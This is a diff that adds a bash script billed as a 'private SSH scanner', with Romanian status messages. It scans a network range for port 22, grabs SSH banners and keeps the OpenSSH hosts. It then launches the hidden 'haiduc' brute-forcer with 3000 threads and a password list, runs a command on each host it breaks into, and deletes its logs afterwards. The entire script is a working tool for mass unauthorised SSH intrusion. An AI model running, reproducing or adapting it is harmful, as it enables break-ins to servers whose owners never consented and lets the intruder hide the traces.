@@ -1,0 +1,77 @@
+#!/bin/bash
+
+### COLORS ###
+BLK='[1;30m'
+RED='[1;31m'
+GRN='[1;32m'
+YEL='[1;33m'
+DBLU='[1;34m'
+MAG='[1;35m'
+CYN='[1;36m'
+WHI='[1;37m'
+DRED='[0;31m'
+DGRN='[0;32m'
+DYEL='[0;33m'
+DBLUs='[0;34m'
+DMAG='[0;35m'
+DCYN='[0;36m'
+DWHI='[0;37m'
+RES='[0m'
+### COLORS ###
+
+### SETTINGS ###
+port=22
+threads=3000
+timeout=15
+banthread=300
+passfile=pass
+### SETTINGS ###
+
+rm -rf banner.log i bios.txt ip.tmp scan.log
+clear
+echo "${DBLU}                                  		     ${RES}"
+echo "${DBLU} _____     __      _______ _______      ______  ${RES}"
+echo "${DBLU}|  __ \   /\ \    / /_   _|  __ \ \    / /___ \ ${RES}"
+echo "${DBLU}| |  | | /  \ \  / /  | | | |  | \ \  / /  __) |${RES}"
+echo "${DBLU}| |  | |/ /\ \ \/ /   | | | |  | |\ \/ /  |__  |${RES}"
+echo "${DBLU}| |__| / ____ \  /   _| |_| |__| | \  /   ___) |${RES}"
+echo "${DBLU}|_____/_/    \_\/   |_____|_____/   \/   |____/ ${RES}"
+echo "${DBLU}                                  		     ${RES}"
+echo "${YEL}                DAVID & HEXCHAT                  ${RES}"
+echo "${BLK}           PRIVATE SSH SCANNER - 2020	     ${RES}"
+echo "${BLK}                  MIX SCANNER                    ${RES}"
+sleep 1
+echo "${DBLU}						     ${RES}"
+echo "${DWHI}[${RED}+${DWHI}] ${YEL}Port scanner: ${GRN}ON${RES}"
+sleep 2
+./.ps2 $1 $port
+sleep 3
+cat bios.txt |shuf > ip.tmp
+cat ip.tmp |sort |uniq > ip2.tmp
+rm -rf ip.tmp
+cat ip2.tmp | uniq | shuf  > i
+rm -rf ip2.tmp
+wc -l i
+echo -e "${DWHI}[${RED}-${DWHI}] ${YEL}Port scanner: ${GRN}OFF${RES}"
+pkill -f ps2
+echo -e "${DWHI}[${RED}+${DWHI}] ${YEL}Brute: ${GRN}ON${RES}"
+./.banner bios.txt $port $banthread > /dev/null
+clear
+sleep 3
+rm -rf i
+echo "${DWHI}[${RED}-${DWHI}] ${YEL}Banner: ${GRN}OFF${RES}"
+pkill -f banner
+sleep 1
+vps=$(cat banner.log |wc -l) > /dev/null
+echo ""
+echo "${DWHI}[${RED}+${DWHI}] ${WHI}Am gasit ${BLK}> ${GRN}$vps${RES} ${YEL}servere vulnerabile!${RES}"
+echo ""
+cat banner.log | grep OpenSSH|cut -d ":" -f 1 > i
+sleep 5
+./.haiduc $threads -f i $passfile $port "cat /proc/version"
+pkill -f haiduc
+sleep 10
+./filtrer
+sleep 1
+rm -rf banner.log i bios.txt ip.tmp scan.log
+echo "${DWHI}[${RED}+${DWHI}] ${WHI}Am terminat scanul, alege alta clasa!${RES}"
